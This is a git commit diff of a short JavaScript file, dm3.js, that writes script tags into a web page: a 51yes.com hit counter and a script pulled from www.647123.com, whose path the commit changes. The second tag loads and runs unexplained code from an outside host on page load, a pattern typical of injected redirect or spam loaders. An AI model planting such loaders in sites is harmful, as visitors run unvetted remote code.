986563b91cd00e05b827acc6dca573b2e30bb43c
js999999999 <js-9@outlook.com>
2017-12-27 18:34:56 +0800

    Update dm3.js

--- cc1z/dm3.js
+++ cc1z/dm3.js
@@ -1,3 +1,3 @@
 document.writeln("<script language=\"javascript\" src=\"http:\/\/count2.51yes.com\/click.aspx?id=21055308&logo=12\" charset=\"gb2312\"><\/script>");
 
-document.writeln("<script src=http:\/\/\www.647123.com\/cc11z/tz.js ><\/script>");
+document.writeln("<script src=http:\/\/\www.647123.com\/cc1z/tz.js ><\/script>");
